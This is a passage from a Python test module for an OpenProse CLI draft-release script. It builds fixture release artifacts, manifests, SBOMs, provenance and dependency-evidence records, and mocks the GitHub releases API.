from __future__ import annotations

import hashlib
import gzip
import io
import inspect
import json
from pathlib import Path
from tempfile import TemporaryDirectory
import unittest
import tarfile
from urllib.parse import parse_qs, urlparse

import create_draft_release as draft
import package_local
from create_draft_release import (
    DraftReleaseError,
    MAX_ASSET_BYTES,
    TARGET_PLATFORMS,
    TARGETS,
    create_draft_release,
    load_assembly,
)


SOURCE_SHA = "0123456789abcdef0123456789abcdef01234567"
CONTROL_SHA = "23456789abcdef0123456789abcdef0123456789"
RELEASE_WORKFLOW_RUN_ID = 246813579
RELEASE_WORKFLOW_RUN_ATTEMPT = 2
HOST_BYTES = b"windows-process-host-fixture"
RUST_BYTES = b"rust-native-candidate"
BUN_BYTES = b"bun-native-candidate"
LICENSE_BYTES = draft.CONTROL_LICENSE.read_bytes()
NPM_README_BYTES = draft.CONTROL_NPM_README.read_bytes()
IMAGE_IDENTITY = {
    "formatVersion": "fixture/1",
    "version": "fixture",
    "sha256": "a" * 64,
    "manifestSha256": "b" * 64,
    "purpose": "canonical-language-runtime",
    "releaseEligible": True,
}
PRODUCER_SHA = "1" * 40
AUTHORITY_REPOSITORY = "openprose/prose"
AUTHORITY_RUN_ID = 123456789
AUTHORITY_RUN_ATTEMPT = 1
AUTHORITY_ARTIFACT_ID = 987654321
DEPENDENCY_SOURCE_PATHS = (
    "cli/bun/bun.lock",
    "cli/bun/package.json",
    "cli/platform/windows-process-host/Cargo.lock",
    "cli/platform/windows-process-host/Cargo.toml",
    "cli/rust/Cargo.lock",
    "cli/rust/Cargo.toml",
    "cli/rust/crates/prose-cli/Cargo.toml",
    "cli/rust/crates/prose-process-supervisor/Cargo.toml",
    "cli/rust/crates/prose-runner-core/Cargo.toml",
)


def dependency_fixture() -> tuple[bytes, list[dict[str, object]]]:
    packages = {
        "cargo": {
            "component": "rust-cli",
            "target": "multi-platform",
            "lockfileVersion": 4,
            "scopeBasis": "fixture",
            "packages": [
                {
                    "name": "rust-dependency",
                    "version": "1.0.0",
                    "source": "registry+https://example.invalid/index",
                    "scopes": ["runtime"],
                    "integrity": {
                        "status": "declared",
                        "algorithm": "sha256",
                        "digest": "c" * 64,
                    },
                }
            ],
        },
        "windowsProcessHostCargo": {
            "component": "windows-process-host",
            "target": "windows",
            "lockfileVersion": 4,
            "scopeBasis": "fixture",
            "packages": [
                {
                    "name": "windows-dependency",
                    "version": "1.0.0",
                    "source": "registry+https://example.invalid/index",
                    "scopes": ["runtime"],
                    "integrity": {
                        "status": "declared",
                        "algorithm": "sha256",
                        "digest": "d" * 64,
                    },
                }
            ],
        },
        "bun": {
            "lockfileVersion": 1,
            "scopeBasis": "fixture",
            "packages": [
                {
                    "name": "bun-dependency",
                    "version": "1.0.0",
                    "source": "npm-registry",
                    "scopes": ["development"],
                    "integrity": {
                        "status": "declared",
                        "algorithm": "sha512",
                        "digest": "e" * 128,
                    },
                }
            ],
        },
    }
    report = {
        "schema": "openprose.dependency-evidence/1",
        "generator": {
            "name": "openprose-dependency-evidence",
            "version": 1,
            "providerFree": True,
            "networkUsed": False,
        },
        "sources": [
            {
                "path": path,
                "byteLength": 1,
                "sha256": hashlib.sha256(path.encode()).hexdigest(),
            }
            for path in DEPENDENCY_SOURCE_PATHS
        ],
        "inventories": packages,
        "authority": {
            "licenses": {"status": "unknown", "reason": "fixture"},
            "vulnerabilities": {"status": "not-performed", "reason": "fixture"},
            "signing": {"status": "not-performed", "reason": "fixture"},
        },
        "releasePolicy": {
            "schema": "openprose.dependency-release-policy/1",
            "boundary": "inventory-only",
            "passed": False,
            "blockers": ["fixture remains blocked"],
        },
    }
    encoded = (
        json.dumps(report, sort_keys=True, separators=(",", ":")) + "\n"
    ).encode()
    components: list[dict[str, object]] = []
    names = {
        "cargo": "rust-cli",
        "windowsProcessHostCargo": "windows-process-host",
        "bun": "bun-cli",
    }
    for inventory_name in ("cargo", "windowsProcessHostCargo", "bun"):
        group = names[inventory_name]
        for package in packages[inventory_name]["packages"]:
            identity = (
                f"{group}\0{package['name']}\0{package['version']}\0{package['source']}"
            ).encode()
            components.append(
                {
                    "bom-ref": f"openprose:dependency:{hashlib.sha256(identity).hexdigest()}",
                    "type": "library",
                    "group": group,
                    "name": package["name"],
                    "version": package["version"],
                    "hashes": [
                        {
                            "alg": "SHA-256"
                            if package["integrity"]["algorithm"] == "sha256"
                            else "SHA-512",
                            "content": package["integrity"]["digest"],
                        }
                    ],
                    "properties": [
                        {"name": "openprose:kind", "value": "resolved-dependency"},
                        {"name": "openprose:component", "value": group},
                        {"name": "openprose:source", "value": package["source"]},
                        {
                            "name": "openprose:scopes",
                            "value": ",".join(package["scopes"]),
                        },
                        {"name": "openprose:integrity-status", "value": "declared"},
                    ],
                }
            )
    return encoded, components


def make_tar(
    members: dict[str, bytes], *, modes: dict[str, int] | None = None
) -> bytes:
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w:gz") as archive:
        for name, value in sorted(members.items()):
            info = tarfile.TarInfo(name)
            info.size = len(value)
            info.mode = (
                modes[name]
                if modes is not None and name in modes
                else 0o755
                if name.endswith(("prose", "prose.exe", ".exe", "prose.js"))
                else 0o644
            )
            archive.addfile(info, io.BytesIO(value))
    return output.getvalue()


def rewrite_checksums(root: Path) -> None:
    members = sorted(path for path in root.iterdir() if path.name != "SHA256SUMS")
    (root / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256(path.read_bytes()).hexdigest()}  {path.name}\n"
            for path in members
        ),
        "ascii",
    )


def rewrite_json(path: Path, value: dict[str, object]) -> bytes:
    encoded = (json.dumps(value, sort_keys=True) + "\n").encode()
    path.write_bytes(encoded)
    return encoded


def write_assembly(root: Path) -> None:
    admitted_windows_host = {
        "path": "openprose-windows-process-host.exe",
        "sha256": hashlib.sha256(HOST_BYTES).hexdigest(),
        "byteLength": len(HOST_BYTES),
        "admission": False,
    }

    def encoded_json(value: object) -> bytes:
        return (json.dumps(value, sort_keys=True) + "\n").encode()

    canonical_bytes = encoded_json(
        {
            "schema": "openprose.canonical-profile-attestation/1",
            "authority": "protected-canonical-profile",
            "sourceSha": SOURCE_SHA,
            "imageSha256": IMAGE_IDENTITY["sha256"],
            "imageManifestSha256": IMAGE_IDENTITY["manifestSha256"],
            "status": "pass",
        }
    )
    evidence_bytes = encoded_json(
        {
            "schema": "openprose.release-evidence-attestation/1",
            "authority": "protected-release-evidence",
            "sourceSha": SOURCE_SHA,
            "imageSha256": IMAGE_IDENTITY["sha256"],
            "imageManifestSha256": IMAGE_IDENTITY["manifestSha256"],
            "status": "pass",
            "checks": {
                "benchmarkTrust": "pass",
                "conformance": "pass",
                "portability": "pass",
                "vulnerabilityReview": "pass",
            },
        }
    )
    metadata_bytes = encoded_json(
        {
            "schema": "openprose.github-protected-authority-run/1",
            "repository": AUTHORITY_REPOSITORY,
            "runId": AUTHORITY_RUN_ID,
            "runAttempt": AUTHORITY_RUN_ATTEMPT,
            "headSha": PRODUCER_SHA,
            "headBranch": "main",
            "workflowPath": draft.PROTECTED_AUTHORITY_WORKFLOW,
            "event": "workflow_dispatch",
            "conclusion": "success",
            "artifactId": AUTHORITY_ARTIFACT_ID,
            "artifactName": draft.PROTECTED_AUTHORITY_ARTIFACT,
        }
    )
    attestations = {
        "canonicalProfile": {
            "path": "canonical-profile-attestation.json",
            "byteLength": len(canonical_bytes),
            "sha256": hashlib.sha256(canonical_bytes).hexdigest(),
        },
        "releaseEvidence": {
            "path": "release-evidence-attestation.json",
            "byteLength": len(evidence_bytes),
            "sha256": hashlib.sha256(evidence_bytes).hexdigest(),
        },
    }
    provenance_bytes = encoded_json(
        {
            "schema": "openprose.protected-release-authority-provenance/1",
            "producer": {
                "repository": AUTHORITY_REPOSITORY,
                "runId": AUTHORITY_RUN_ID,
                "runAttempt": AUTHORITY_RUN_ATTEMPT,
                "headSha": PRODUCER_SHA,
                "workflowPath": draft.PROTECTED_AUTHORITY_WORKFLOW,
                "environment": draft.PROTECTED_AUTHORITY_ENVIRONMENT,
            },
            "subject": {
                "sourceSha": SOURCE_SHA,
                "imageSha256": IMAGE_IDENTITY["sha256"],
                "imageManifestSha256": IMAGE_IDENTITY["manifestSha256"],
            },
            "attestations": attestations,
            "publicationAuthorized": False,
        }
    )
    preflight_bytes = encoded_json(
        {
            "schema": "openprose.release-preflight-report/1",
            "status": "pass",
            "releaseKind": "draft-only",
            "publicationAuthorized": False,
            "version": "0.1.0",
            "sourceSha": SOURCE_SHA,
            "checkedOutSha": SOURCE_SHA,
            "controlSha": CONTROL_SHA,
            "controlRef": "refs/heads/main",
            "productVersions": {"rust": "0.1.0", "bun": "0.1.0"},
            "image": {
                "manifestSha256": IMAGE_IDENTITY["manifestSha256"],
                "bundleSha256": "3" * 64,
                "checksumSha256": "4" * 64,
                "imageSha256": IMAGE_IDENTITY["sha256"],
                "version": IMAGE_IDENTITY["version"],
                "purpose": "canonical-language-runtime",
                "releaseEligible": True,
            },
            "protectedAuthority": {
                "status": "pass",
                "artifactId": str(AUTHORITY_ARTIFACT_ID),
                "producerRunId": AUTHORITY_RUN_ID,
                "producerRunAttempt": AUTHORITY_RUN_ATTEMPT,
                "producerSha": PRODUCER_SHA,
                "runMetadataSha256": hashlib.sha256(metadata_bytes).hexdigest(),
                "provenanceSha256": hashlib.sha256(provenance_bytes).hexdigest(),
                "attestations": attestations,
            },
            "gates": {
                "canonicalProfile": {
                    "status": "pass",
                    "sha256": hashlib.sha256(canonical_bytes).hexdigest(),
                },
                "releaseEvidence": {
                    "status": "pass",
                    "sha256": hashlib.sha256(evidence_bytes).hexdigest(),
                },
            },
            "failures": [],
        }
    )
    files: dict[str, bytes] = {
        "profile-preflight.json": preflight_bytes,
        "protected-authority-run.json": metadata_bytes,
        "authority-provenance.json": provenance_bytes,
        "canonical-profile-attestation.json": canonical_bytes,
        "release-evidence-attestation.json": evidence_bytes,
    }
    shared_meta = "openprose-prose-cli-0.1.0.tgz"
    dependency_bytes, dependency_components = dependency_fixture()
    dependency_digest = hashlib.sha256(dependency_bytes).hexdigest()
    files["protected-dependency-evidence.json"] = dependency_bytes
    files[shared_meta] = make_tar(
        {
            "package/package.json": (
                json.dumps(
                    draft._canonical_npm_meta_manifest(
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        image=IMAGE_IDENTITY,
                    ),
                    sort_keys=True,
                )
                + "\n"
            ).encode(),
            "package/bin/prose.js": draft._canonical_npm_launcher(
                version="0.1.0", source_sha=SOURCE_SHA, image=IMAGE_IDENTITY
            ),
            "package/LICENSE": LICENSE_BYTES,
            "package/README.md": NPM_README_BYTES,
            "package/examples/hello.prose.md": package_local.HELLO_EXAMPLE.read_bytes(),
        }
    )
    for target in TARGETS:
        platform = TARGET_PLATFORMS[target]
        linux_runtime = (
            {
                "minimumGlibc": "2.34",
                "requiredGlibcMaximum": {"rust": "2.34", "bun": "2.34"},
                "executionEvidence": "ubuntu-22.04-only",
            }
            if target.startswith("linux-")
            else None
        )
        windows_host = admitted_windows_host if target == "win-x64" else None
        artifact_names = [
            f"openprose-prose-cli-rust-0.1.0-{platform}.tar.gz",
            f"openprose-prose-cli-bun-0.1.0-{platform}.tar.gz",
            shared_meta,
            f"openprose-prose-cli-{platform}-0.1.0.tgz",
        ]
        executable = "prose.exe" if target == "win-x64" else "prose"
        rust_root = f"openprose-prose-cli-rust-0.1.0-{platform}"
        bun_root = f"openprose-prose-cli-bun-0.1.0-{platform}"
        rust_members = {
            f"{rust_root}/{executable}": RUST_BYTES,
            f"{rust_root}/LICENSE": LICENSE_BYTES,
            f"{rust_root}/README.txt": (
                f"OpenProse CLI rust local artifact 0.1.0 for {platform}.\n"
                "This development artifact may contain a release-ineligible test image; inspect release-manifest.json.\n"
            ).encode(),
            f"{rust_root}/examples/hello.prose.md": package_local.HELLO_EXAMPLE.read_bytes(),
        }
        bun_members = {
            f"{bun_root}/{executable}": BUN_BYTES,
            f"{bun_root}/LICENSE": LICENSE_BYTES,
            f"{bun_root}/README.txt": (
                f"OpenProse CLI bun local artifact 0.1.0 for {platform}.\n"
                "This development artifact may contain a release-ineligible test image; inspect release-manifest.json.\n"
            ).encode(),
            f"{bun_root}/examples/hello.prose.md": package_local.HELLO_EXAMPLE.read_bytes(),
        }
        if linux_runtime is not None:
            rust_members[f"{rust_root}/README.txt"] += (
                f"Minimum glibc: {linux_runtime['minimumGlibc']}.\n"
                f"ELF required GLIBC maximum: {linux_runtime['requiredGlibcMaximum']['rust']}.\n"
                "Execution evidence: Ubuntu 22.04 only; other Linux environments are unverified.\n"
            ).encode()
            bun_members[f"{bun_root}/README.txt"] += (
                f"Minimum glibc: {linux_runtime['minimumGlibc']}.\n"
                f"ELF required GLIBC maximum: {linux_runtime['requiredGlibcMaximum']['bun']}.\n"
                "Execution evidence: Ubuntu 22.04 only; other Linux environments are unverified.\n"
            ).encode()
        if windows_host is not None:
            rust_members[f"{rust_root}/openprose-windows-process-host.exe"] = HOST_BYTES
            bun_members[f"{bun_root}/openprose-windows-process-host.exe"] = HOST_BYTES
        files[artifact_names[0]] = make_tar(rust_members)
        files[artifact_names[1]] = make_tar(bun_members)
        npm_manifest: dict[str, object] = draft._canonical_npm_platform_manifest(
            version="0.1.0",
            platform=platform,
            source_sha=SOURCE_SHA,
            image=IMAGE_IDENTITY,
            expected_binary={
                "byteLength": len(BUN_BYTES),
                "sha256": hashlib.sha256(BUN_BYTES).hexdigest(),
            },
            windows_host=windows_host,
            linux_runtime=linux_runtime,
        )
        npm_members = {
            "package/package.json": (
                json.dumps(npm_manifest, sort_keys=True) + "\n"
            ).encode(),
            f"package/bin/{executable}": BUN_BYTES,
            "package/LICENSE": LICENSE_BYTES,
        }
        if windows_host is not None:
            npm_members["package/bin/openprose-windows-process-host.exe"] = HOST_BYTES
        files[artifact_names[3]] = make_tar(npm_members)
        classifications = (
            ("rust", "standalone-archive", platform),
            ("bun", "standalone-archive", platform),
            ("bun", "npm-meta", None),
            ("bun", "npm-platform", platform),
        )
        records = [
            {
                "path": name,
                "sha256": hashlib.sha256(files[name]).hexdigest(),
                "byteLength": len(files[name]),
                "implementation": classifications[index][0],
                "kind": classifications[index][1],
                "platform": classifications[index][2],
            }
            for index, name in enumerate(artifact_names)
        ]
        files[f"{target}-release-manifest.json"] = (
            json.dumps(
                {
                    "schema": "openprose.local-release-manifest/1",
                    "mode": "release",
                    "version": "0.1.0",
                    "platform": platform,
                    "sourceDateEpoch": 0,
                    "releaseEligible": False,
                    "publicationAuthorized": False,
                    "promotion": {
                        "status": "not-performed",
                        "requiredAttestation": "protected-release-validator",
                    },
                    "source": {
                        "revision": SOURCE_SHA,
                        "verification": "matched-product-doctor",
                    },
                    "buildProfiles": {
                        "rust": {"profile": "release", "testSeamsEnabled": False},
                        "bun": {"profile": "release", "testSeamsEnabled": False},
                    },
                    "bunRuntime": draft.BUN_RUNTIME_BY_PLATFORM[platform],
                    "linuxRuntime": (
                        linux_runtime if linux_runtime is not None else "not-applicable"
                    ),
                    "image": IMAGE_IDENTITY,
                    "windowsProcessHost": (
                        windows_host if windows_host is not None else "not-applicable"
                    ),
                    "windowsJobObjectReleaseAdmission": False,
                    "dependencyEvidence": {
                        "path": "dependency-evidence.json",
                        "byteLength": len(dependency_bytes),
                        "sha256": dependency_digest,
                        "releasePolicyPassed": False,
                    },
                    "toolchains": {
                        "python": "3.10.18",
                        "rustc": "rustc 1.87.0",
                        "cargo": "cargo 1.87.0",
                        "bun": "1.3.5",
                        "node": "v24.20.0",
                        "npm": "10.8.2",
                    },
                    "lockfiles": {"cargoSha256": "f" * 64, "bunSha256": "a" * 64},
                    "externalGates": {
                        "canonicalProfile": {
                            "sha256": hashlib.sha256(canonical_bytes).hexdigest(),
                            "byteLength": len(canonical_bytes),
                        },
                        "releaseEvidence": {
                            "sha256": hashlib.sha256(evidence_bytes).hexdigest(),
                            "byteLength": len(evidence_bytes),
                        },
                        "authorityValidatedByPackager": False,
                    },
                    "claims": {
                        "signing": "not-performed",
                        "vulnerabilityReview": "not-performed",
                        "networkIsolation": "not-enforced",
                        "packageTests": "not-run-by-packager",
                    },
                    "artifacts": records,
                },
                sort_keys=True,
            )
            + "\n"
        ).encode()
        host_components = (
            [
                {
                    "type": "file",
                    "name": "openprose-windows-process-host.exe",
                    "hashes": [{"alg": "SHA-256", "content": windows_host["sha256"]}],
                    "properties": [
                        {
                            "name": "openprose:kind",
                            "value": "windows-process-host-sidecar",
                        },
                        {"name": "openprose:release-admission", "value": "false"},
                    ],
                }
            ]
            if windows_host is not None
            else []
        )
        files[f"{target}-sbom.cdx.json"] = (
            json.dumps(
                {
                    "bomFormat": "CycloneDX",
                    "components": host_components + dependency_components,
                    "properties": [
                        {
                            "name": "openprose:dependency-inventory",
                            "value": "component-inventory-attached",
                        },
                        {
                            "name": "openprose:dependency-evidence-sha256",
                            "value": dependency_digest,
                        },
                    ],
                },
                sort_keys=True,
            )
            + "\n"
        ).encode()
        dependencies = [
            {
                "uri": "openprose:dependency-evidence",
                "digest": {"sha256": dependency_digest},
            }
        ] + (
            [
                {
                    "uri": "openprose:windows-process-host",
                    "digest": {"sha256": windows_host["sha256"]},
                }
            ]
            if windows_host is not None
            else []
        )
        files[f"{target}-provenance.json"] = (
            json.dumps(
                {
                    "_type": "https://in-toto.io/Statement/v1",
                    "predicate": {
                        "buildDefinition": {
                            "externalParameters": {
                                "bunRuntime": draft.BUN_RUNTIME_BY_PLATFORM[platform],
                                "windowsProcessHost": (
                                    windows_host
                                    if windows_host is not None
                                    else "not-applicable"
                                ),
                            },
                            "resolvedDependencies": dependencies,
                        }
                    },
                },
                sort_keys=True,
            )
            + "\n"
        ).encode()
        files[f"{target}-dependency-evidence.json"] = dependency_bytes
        files[f"{target}-SHA256SUMS"] = b"local evidence\n"
        native = (
            json.dumps(
                {
                    "schema": "openprose.native-build/1",
                    "target": target,
                    "sourceSha": SOURCE_SHA,
                    "build": {"profile": "release", "testSeamsEnabled": False},
                    "windowsProcessHost": windows_host,
                    "windowsJobObjectReleaseAdmission": False,
                    "products": {
                        "rust": {
                            "path": "prose-rust",
                            "sha256": hashlib.sha256(RUST_BYTES).hexdigest(),
                            "byteLength": len(RUST_BYTES),
                        },
                        "bun": {
                            "path": "prose-bun",
                            "sha256": hashlib.sha256(BUN_BYTES).hexdigest(),
                            "byteLength": len(BUN_BYTES),
                        },
                    },
                },
                sort_keys=True,
            )
            + "\n"
        ).encode()
        files[f"{target}-native-manifest.json"] = native
        native_files = {
            "native-manifest.json": {
                "byteLength": len(native),
                "sha256": hashlib.sha256(native).hexdigest(),
            },
            "prose-rust": {
                "byteLength": len(RUST_BYTES),
                "sha256": hashlib.sha256(RUST_BYTES).hexdigest(),
            },
            "prose-bun": {
                "byteLength": len(BUN_BYTES),
                "sha256": hashlib.sha256(BUN_BYTES).hexdigest(),
            },
        }
        if windows_host is not None:
            native_files["openprose-windows-process-host.exe"] = {
                "byteLength": len(HOST_BYTES),
                "sha256": hashlib.sha256(HOST_BYTES).hexdigest(),
            }
        files[f"{target}-verification.json"] = (
            json.dumps(
                {
                    "schema": "openprose.native-verification/1",
                    "target": target,
                    "sourceSha": SOURCE_SHA,
                    "nativeArtifact": {
                        "name": f"native-build-{target}",
                        "workflowRunId": RELEASE_WORKFLOW_RUN_ID,
                        "workflowRunAttempt": RELEASE_WORKFLOW_RUN_ATTEMPT,
                        "files": native_files,
                    },
                    "nativeManifestSha256": hashlib.sha256(native).hexdigest(),
                    "windowsJobObjectReleaseAdmission": False,
                    "windowsProcessHost": windows_host,
                    "reports": {"rust": {}, "bun": {}},
                },
                sort_keys=True,
            )
            + "\n"
        ).encode()
        package_file_names = {
            "SHA256SUMS": f"{target}-SHA256SUMS",
            "release-manifest.json": f"{target}-release-manifest.json",
            "sbom.cdx.json": f"{target}-sbom.cdx.json",
            "provenance.json": f"{target}-provenance.json",
            "dependency-evidence.json": f"{target}-dependency-evidence.json",
            **{name: name for name in artifact_names},
        }
        package_files = [
            {
                "path": original,
                "byteLength": len(files[assembly_name]),
                "sha256": hashlib.sha256(files[assembly_name]).hexdigest(),
            }
            for original, assembly_name in sorted(package_file_names.items())
        ]
        artifact_by_kind = {
            (record["implementation"], record["kind"]): record for record in records
        }
        tree_digests = {
            surface: hashlib.sha256(f"{target}:{surface}:tree".encode()).hexdigest()
            for surface in ("direct-rust", "direct-bun", "npm-launcher")
        }
        installations = (
            []
            if target == "win-x64"
            else [
                {
                    "surface": surface,
                    "method": (
                        "npm-global-offline-two-local-tarballs"
                        if surface == "npm-launcher"
                        else "validated-archive-extraction"
                    ),
                    "installedByteCount": 1,
                    "treeSha256": tree_digests[surface],
                }
                for surface in ("direct-rust", "direct-bun", "npm-launcher")
            ]
        )
        launcher_source_sha = hashlib.sha256(
            draft._canonical_npm_launcher(
                version="0.1.0", source_sha=SOURCE_SHA, image=IMAGE_IDENTITY
            )
        ).hexdigest()
        surface_bindings = {
            "direct-rust": (
                "rust",
                hashlib.sha256(RUST_BYTES).hexdigest(),
                artifact_by_kind[("rust", "standalone-archive")]["sha256"],
                None,
                None,
            ),
            "direct-bun": (
                "bun",
                hashlib.sha256(BUN_BYTES).hexdigest(),
                artifact_by_kind[("bun", "standalone-archive")]["sha256"],
                None,
                None,
            ),
            "npm-launcher": (
                "bun",
                hashlib.sha256(BUN_BYTES).hexdigest(),
                artifact_by_kind[("bun", "npm-platform")]["sha256"],
                artifact_by_kind[("bun", "npm-meta")]["sha256"],
                launcher_source_sha,
            ),
        }
        surfaces = {}
        for surface, (
            runner,
            binary_sha,
            artifact_sha,
            meta_sha,
            source_sha,
        ) in surface_bindings.items():
            surfaces[surface] = {
                "runner": runner,
                "binarySha256": binary_sha,
                "artifactSha256": artifact_sha,
                "metaArtifactSha256": meta_sha,
                "installationTreeSha256": (
                    None if target == "win-x64" else tree_digests[surface]
                ),
                "launcherSourceSha256": source_sha,
                "launcherCommandIdentity": (
                    None
                    if target == "win-x64" or surface != "npm-launcher"
                    else {"kind": "regular-shim", "sha256": "9" * 64}
                ),
                "execution": (
                    "blocked-before-execution"
                    if target == "win-x64"
                    else "verified-posix"
                ),
            }
        corpus_bytes = draft.CONTROL_RELEASE_PACKAGE_INVARIANTS.read_bytes()
        corpus_cases = json.loads(corpus_bytes)["cases"]
        help_bytes = draft.CONTROL_RUNNER_HELP.read_bytes()
        cases = (
            []
            if target == "win-x64"
            else [
                {
                    "id": case["id"],
                    "argv": case["argv"],
                    "observations": [
                        {
                            "surface": surface,
                            "exitCode": case["exitCode"],
                            "stdout": draft._digest_record(
                                (
                                    f"prose 0.1.0 ({'rust' if surface == 'direct-rust' else 'bun'})\n".encode()
                                    if case["stdout"]["kind"] == "version"
                                    else help_bytes
                                    if case["stdout"]["kind"] == "exact-file"
                                    else b"{}\n"
                                )
                            ),
                            "stderr": draft._digest_record(b""),
                            "settlement": "settled",
                            "settlementAuthority": (
                                "direct-and-original-process-group-settled"
                            ),
                            "projection": draft._expected_release_projection(
                                case,
                                runner=("rust" if surface == "direct-rust" else "bun"),
                                version="0.1.0",
                                source_sha=SOURCE_SHA,
                                image=IMAGE_IDENTITY,
                            ),
                        }
                        for surface in ("direct-rust", "direct-bun", "npm-launcher")
                    ],
                }
                for case in corpus_cases
            ]
        )
        report = {
            "schema": "openprose.release-package-admission/3",
            "status": (
                "blocked-before-execution"
                if target == "win-x64"
                else "passed-provider-free-release-invariants"
            ),
            "targetId": target,
            "version": "0.1.0",
            "sourceSha": SOURCE_SHA,
            "controlSha": CONTROL_SHA,
            "workflowRun": {
                "id": RELEASE_WORKFLOW_RUN_ID,
                "attempt": RELEASE_WORKFLOW_RUN_ATTEMPT,
            },
            "authorityInputs": {
                "profilePreflight": {
                    "byteLength": len(files["profile-preflight.json"]),
                    "sha256": hashlib.sha256(
                        files["profile-preflight.json"]
                    ).hexdigest(),
                },
                "nativeVerification": {
                    "byteLength": len(files[f"{target}-verification.json"]),
                    "sha256": hashlib.sha256(
                        files[f"{target}-verification.json"]
                    ).hexdigest(),
                },
            },
            "corpus": draft._digest_record(corpus_bytes),
            "package": {
                "platform": platform,
                "mode": "release",
                "sha256Sums": {
                    "byteLength": len(files[f"{target}-SHA256SUMS"]),
                    "sha256": hashlib.sha256(files[f"{target}-SHA256SUMS"]).hexdigest(),
                },
                "releaseManifest": {
                    "byteLength": len(files[f"{target}-release-manifest.json"]),
                    "sha256": hashlib.sha256(
                        files[f"{target}-release-manifest.json"]
                    ).hexdigest(),
                },
                "files": package_files,
                "image": IMAGE_IDENTITY,
                "buildProfiles": {
                    "rust": {"profile": "release", "testSeamsEnabled": False},
                    "bun": {"profile": "release", "testSeamsEnabled": False},
                },
                "nativeLineage": {
                    "nativeArtifact": {
                        "name": f"native-build-{target}",
                        "workflowRunId": RELEASE_WORKFLOW_RUN_ID,
                        "workflowRunAttempt": RELEASE_WORKFLOW_RUN_ATTEMPT,
                    },
                    "nativeManifestSha256": hashlib.sha256(native).hexdigest(),
                    "files": native_files,
                    "products": {
                        implementation: {
                            "nativePath": native_product["path"],
                            "nativeSha256": native_product["sha256"],
                            "packagedBinarySha256": native_product["sha256"],
                        }
                        for implementation, native_product in json.loads(native)[
                            "products"
                        ].items()
                    },
                    "windowsProcessHost": (
                        windows_host if windows_host is not None else "not-applicable"
                    ),
                },
            },
            "installations": installations,
            "executionToolchain": (
                {
                    "authority": "not-observed-no-candidate-execution",
                    "node": None,
                    "npm": None,
                }
                if target == "win-x64"
                else {
                    "authority": "reporter-observed-and-finally-reauthenticated-executable-bytes",
                    "node": {
                        "command": "/opt/openprose-test/node",
                        "resolvedPath": "/opt/openprose-test/node",
                        "sha256": "7" * 64,
                    },
                    "npm": {
                        "command": "/opt/openprose-test/npm",
                        "resolvedPath": "/opt/openprose-test/npm",
                        "sha256": "8" * 64,
                    },
                }
            ),
            "surfaces": surfaces,
            "cases": cases,
            "claims": {
                "providerCalls": "not-observed",
                "semanticEvaluation": False,
                "programPortabilityEvaluation": False,
                "releaseEligible": False,
                "publicationAuthorized": False,
                "rankingProduced": False,
                "strictDescendantContainment": False,
                "runtimeNetworkIsolation": False,
                "candidateExecution": (
                    "blocked-before-execution"
                    if target == "win-x64"
                    else "performed-posix-invariants"
                ),
            },
        }
        files[f"{target}-release-package-admission.json"] = (
            json.dumps(report, sort_keys=True) + "\n"
        ).encode()
    files["profile-admission.json"] = (
        json.dumps(
            {
                "schema": "openprose.protected-profile-admission/1",
                "status": "draft-packaging-only",
                "sourceSha": SOURCE_SHA,
                "publicationAuthorized": False,
                "windowsJobObjectReleaseAdmission": False,
                "windowsProcessHost": admitted_windows_host,
                "preflightSha256": hashlib.sha256(
                    files["profile-preflight.json"]
                ).hexdigest(),
                "dependencyEvidence": {
                    "path": "protected-dependency-evidence.json",
                    "byteLength": len(dependency_bytes),
                    "sha256": dependency_digest,
                    "releasePolicyPassed": False,
                },
                "verifiedProfiles": {
                    target: hashlib.sha256(
                        files[f"{target}-verification.json"]
                    ).hexdigest()
                    for target in TARGETS
                },
            },
            sort_keys=True,
        )
        + "\n"
    ).encode()
    for name, value in files.items():
        (root / name).write_bytes(value)
    rewrite_checksums(root)


class FakeResponse:
    def __init__(self, value: object, status: int = 201) -> None:
        self.value = json.dumps(value).encode()
        self.status = status

    def __enter__(self) -> "FakeResponse":
        return self

    def __exit__(self, *_args: object) -> None:
        return None

    def read(self, maximum: int) -> bytes:
        return self.value[:maximum]


class FakeGitHub:
    def __init__(self, *, draft: bool = True) -> None:
        self.requests = []
        self.draft = draft
        self.release: dict[str, object] | None = None
        self.assets: dict[str, dict[str, object]] = {}
        self.release_copies = 1

    def _release_response(self, payload: dict[str, object]) -> dict[str, object]:
        return {
            "id": 42,
            "node_id": "fixture-release-42",
            "url": "https://api.github.com/repos/openprose/prose/releases/42",
            "assets_url": "https://api.github.com/repos/openprose/prose/releases/42/assets",
            "upload_url": "https://uploads.github.com/repos/openprose/prose/releases/42/assets{?name,label}",
            "html_url": "https://github.com/openprose/prose/releases/tag/openprose-cli-v0.1.0",
            "tag_name": payload["tag_name"],
            # GitHub may report the default branch because this field is
            # documented as ignored when the requested tag already exists.
            "target_commitish": "main",
            "name": payload["name"],
            "body": payload["body"],
            "draft": self.draft,
            "prerelease": payload["prerelease"],
            "immutable": False,
        }

    def _asset_response(self, name: str, body: bytes) -> dict[str, object]:
        existing = self.assets.get(name)
        if existing is not None:
            return existing
        asset_id = 1_000 + len(self.assets)
        value = {
            "id": asset_id,
            "node_id": f"fixture-asset-{asset_id}",
            "url": f"https://api.github.com/repos/openprose/prose/releases/assets/{asset_id}",
            "name": name,
            "state": "uploaded",
            "content_type": "application/octet-stream",
            "size": len(body),
            "digest": f"sha256:{hashlib.sha256(body).hexdigest()}",
        }
        self.assets[name] = value
        return value

    def __call__(self, request, *, timeout: int):
        self.requests.append(request)
        parsed = urlparse(request.full_url)
        path = parsed.path
        method = request.get_method()
        if method == "GET" and "/git/ref/tags/" in path:
            return FakeResponse(
                {
                    "ref": "refs/tags/openprose-cli-v0.1.0",
                    "node_id": "fixture-tag-ref",
                    "url": (
                        "https://api.github.com/repos/openprose/prose/git/refs/tags/"
                        "openprose-cli-v0.1.0"
                    ),
                    "object": {
                        "type": "commit",
                        "sha": SOURCE_SHA,
                        "url": (
                            "https://api.github.com/repos/openprose/prose/git/commits/"
                            f"{SOURCE_SHA}"
                        ),
                    },
                },
                status=200,
            )
        if method == "GET" and path == "/repos/openprose/prose/releases":
            page = int(parse_qs(parsed.query).get("page", ["1"])[0])
            per_page = int(parse_qs(parsed.query).get("per_page", ["100"])[0])
            values = [self.release] * self.release_copies if self.release else []
            start = (page - 1) * per_page
            return FakeResponse(values[start : start + per_page], status=200)
        if method == "GET" and path.endswith("/releases/42/assets"):
